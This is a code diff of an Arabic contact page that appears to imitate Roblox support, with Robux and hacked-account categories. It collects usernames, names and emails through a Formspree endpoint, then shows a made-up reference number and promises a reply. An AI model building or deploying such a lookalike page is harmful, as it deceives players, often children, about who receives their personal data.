@@ -16,66 +16,92 @@ button:hover{background:#555;}
 </style>
 </head>
 <body>
+
 <div class="container">
 <h2>اتصل بنا</h2>
-<form id="contactForm" action="https://formspree.io/f/xxxxxxx" method="POST">
-<label>اسم المستخدم</label>
-<input type="text" name="username" placeholder="اسم المستخدم">
-<label>الاسم الأول</label>
-<input type="text" name="first_name" placeholder="الاسم الأول">
-<label>الاسم الثاني</label>
-<input type="text" name="last_name" placeholder="الاسم الثاني">
-<label>البريد الإلكتروني</label>
-<input type="email" name="email" placeholder="البريد الإلكتروني" required>
-<label>تأكيد البريد الإلكتروني</label>
-<input type="email" name="confirm_email" placeholder="تأكيد البريد الإلكتروني" required>
-<label>نوع الجهاز</label>
-<select name="device">
-<option value="">اختر النوع</option>
-<option>كمبيوتر</option>
-<option>كمبيوتر محمول</option>
-<option>أندرويد</option>
-<option>iPhone</option>
-<option>تابلت أندرويد</option>
-<option>iPad</option>
-<option>Xbox</option>
-<option>PlayStation</option>
-<option>Meta Quest</option>
-<option>أخرى</option>
-</select>
-<label>نوع فئة المساعدة</label>
-<select name="help_type">
-<option value="">اختر الفئة</option>
-<option>تم اختراق الحساب</option>
-<option>تعذر تسجيل الدخول</option>
-<option>مشتريات Robux</option>
-<option>استرداد Robux</option>
-<option>الإبلاغ عن إساءة</option>
-<option>الإبلاغ عن استغلال</option>
-<option>DMCA</option>
-<option>بطاقة الهدايا</option>
-<option>أفكار واقتراحات</option>
-<option>نصب ممتلكات</option>
-</select>
-<label>يرجى وصف مشكلتك</label>
-<textarea name="message" placeholder="ما هي المشكلة التي تواجهها"></textarea>
-<button type="submit">متابعة</button>
+
+<form id="contactForm" action="https://formspree.io/f/mayourformid" method="POST">
+    <label>اسم المستخدم</label>
+    <input type="text" name="username" placeholder="اسم المستخدم">
+
+    <label>الاسم الأول</label>
+    <input type="text" name="first_name" placeholder="الاسم الأول">
+
+    <label>الاسم الثاني</label>
+    <input type="text" name="last_name" placeholder="الاسم الثاني">
+
+    <label>البريد الإلكتروني</label>
+    <input type="email" name="email" placeholder="البريد الإلكتروني" required>
+
+    <label>تأكيد البريد الإلكتروني</label>
+    <input type="email" name="confirm_email" placeholder="تأكيد البريد الإلكتروني" required>
+
+    <label>نوع الجهاز</label>
+    <select name="device">
+        <option value="">اختر النوع</option>
+        <option value="pc">كمبيوتر</option>
+        <option value="laptop">كمبيوتر محمول</option>
+        <option value="android">أندرويد</option>
+        <option value="iphone">iPhone</option>
+        <option value="tablet_android">تابلت أندرويد</option>
+        <option value="ipad">iPad</option>
+        <option value="xbox">Xbox</option>
+        <option value="ps">PlayStation</option>
+        <option value="vr">Meta Quest</option>
+        <option value="other">أخرى</option>
+    </select>
+
+    <label>نوع فئة المساعدة</label>
+    <select name="help_type">
+        <option value="">اختر الفئة</option>
+        <option value="hacked_account">تم اختراق الحساب</option>
+        <option value="login_issue">تعذر تسجيل الدخول</option>
+        <option value="robux_purchase">مشتريات Robux</option>
+        <option value="robux_refund">استرداد Robux</option>
+        <option value="report_abuse">الإبلاغ عن إساءة</option>
+        <option value="exploit_report">الإبلاغ عن استغلال</option>
+        <option value="dmca">DMCA</option>
+        <option value="gift_card">بطاقة الهدايا</option>
+        <option value="ideas">أفكار واقتراحات</option>
+        <option value="other_help">نصب ممتلكات</option>
+    </select>
+
+    <label>يرجى وصف مشكلتك</label>
+    <textarea name="message" placeholder="ما هي المشكلة التي تواجهها"></textarea>
+
+    <button type="submit">متابعة</button>
 </form>
 </div>
+
 <script>
-function generateReference(){return Math.floor(1000000+Math.random()*9000000);}
-document.getElementById('contactForm').addEventListener('submit',function(e){
-e.preventDefault();
-const form=e.target;
-fetch(form.action,{method:'POST',body:new FormData(form),headers:{'Accept':'application/json'}})
-.then(response=>{
-document.body.innerHTML=`<div style="text-align:center;margin-top:100px;font-family:Arial,sans-serif;">
-<h2>تم إرسال طلبك</h2>
-<p>ستتلقى رد في غضون 15 يوم</p>
-<p>رقم مرجعك: <strong>${generateReference()}</strong></p>
-</div>`;
-}).catch(error=>{alert('حدث خطأ، حاول مرة أخرى.');console.error(error);});
+// توليد رقم مرجع عشوائي 7 أرقام
+function generateReference(){return Math.floor(1000000 + Math.random()*9000000);}
+
+document.getElementById('contactForm').addEventListener('submit', function(e){
+    e.preventDefault();
+    const form = e.target;
+
+    // إرسال النموذج إلى Formspree
+    fetch(form.action, {
+        method: 'POST',
+        body: new FormData(form),
+        headers: { 'Accept': 'application/json' }
+    })
+    .then(response => {
+        // الصفحة البيضاء مع رسالة ورقم المرجع
+        document.body.innerHTML = `
+        <div style="text-align:center;margin-top:100px;font-family:Arial,sans-serif;">
+            <h2>تم إرسال طلبك</h2>
+            <p>ستتلقى رد في غضون 15 يوم</p>
+            <p>رقم مرجعك: <strong>${generateReference()}</strong></p>
+        </div>`;
+    })
+    .catch(error => {
+        alert('حدث خطأ، حاول مرة أخرى.');
+        console.error(error);
+    });
 });
 </script>
+
 </body>
 </html>
